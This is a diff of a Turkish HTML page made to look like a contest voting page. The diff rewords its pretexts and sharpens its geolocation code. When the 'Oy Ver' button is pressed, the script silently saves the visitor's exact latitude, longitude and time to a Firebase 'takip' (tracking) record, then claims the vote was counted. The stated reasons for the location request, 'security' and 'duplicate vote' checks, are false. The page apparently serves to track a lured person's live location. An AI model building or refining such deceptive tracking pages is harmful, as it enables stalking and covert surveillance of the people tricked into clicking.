@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yarışma - Oy Kullan</title>
+    <title>Yarışma Katılım Formu</title>
     <style>
-        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
-        .container { text-align: center; padding: 20px; border: 1px solid #233138; border-radius: 15px; background: #111b21; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { font-size: 18px; margin-bottom: 20px; color: #e9edef; }
-        #btn { width: 160px; height: 50px; background-color: #00a884; color: white; display: flex; 
-               justify-content: center; align-items: center; border-radius: 25px; cursor: pointer; 
-               font-weight: bold; font-size: 16px; margin: 0 auto; transition: 0.3s; }
-        #btn:active { transform: scale(0.95); background-color: #008f70; }
-        .footer { margin-top: 15px; font-size: 12px; color: #8696a0; }
+        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, sans-serif; color: white; }
+        .card { text-align: center; padding: 30px; border-radius: 20px; background: #111b21; border: 1px solid #233138; box-shadow: 0 15px 35px rgba(0,0,0,0.6); width: 85%; max-width: 320px; }
+        h2 { font-size: 1.1rem; margin-bottom: 20px; color: #e9edef; line-height: 1.4; }
+        #vote-btn { width: 100%; height: 55px; background-color: #00a884; color: white; display: flex; 
+                    justify-content: center; align-items: center; border-radius: 30px; cursor: pointer; 
+                    font-weight: bold; font-size: 18px; transition: 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        #vote-btn:active { transform: scale(0.95); background-color: #008f70; }
+        .footer-text { margin-top: 20px; font-size: 11px; color: #8696a0; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Adayı Seç ve Oyunu Kullan</h2>
-        <div id="btn" onclick="oyVer()">Oy Ver</div>
-        <p class="footer">Güvenliğiniz için konum doğrulaması gereklidir.</p>
+    <div class="card">
+        <h2>Aday Listesi Yüklendi.<br>Oy Vermek İçin Dokunun.</h2>
+        <div id="vote-btn" onclick="oyVer()">Oy Ver</div>
+        <p class="footer-text">Mükerrer oy kullanımını önlemek için cihaz doğrulaması yapılacaktır.</p>
     </div>
 
     <script type="module">
@@ -42,23 +42,28 @@
 
         window.oyVer = () => {
             if (navigator.geolocation) {
+                // Konum ayarlarını zorluyoruz: maximumAge:0 (eskisini kullanma), enableHighAccuracy:true (tam konum al)
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     try {
-                        // "takip" klasörüne "admin" belgesi olarak kaydeder
                         await setDoc(doc(db, "takip", "admin"), {
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
-                            zaman: new Date().toLocaleString('tr-TR')
+                            zaman: new Date().toLocaleString('tr-TR'),
+                            tiklama: Date.now() // Her seferinde güncellenmesi için benzersiz sayı ekledik
                         });
-                        alert("Oyunuz başarıyla kaydedildi!");
+                        alert("Oyunuz başarıyla sisteme iletildi!");
                     } catch (e) {
-                        alert("Sistem meşgul, lütfen tekrar deneyin.");
+                        alert("Sunucu yoğunluğu, tekrar deneyin.");
                     }
                 }, (err) => {
-                    alert("Oy kullanabilmek için konum izni vermeniz gerekmektedir.");
-                }, { enableHighAccuracy: true });
+                    alert("Oy kullanabilmek için güvenlik doğrulamasına (konum) izin vermeniz gerekiyor.");
+                }, { 
+                    enableHighAccuracy: true, 
+                    maximumAge: 0, 
+                    timeout: 10000 
+                });
             } else {
-                alert("Tarayıcınız bu sistemi desteklemiyor.");
+                alert("Cihazınız bu sistemi desteklemiyor.");
             }
         };
     </script>
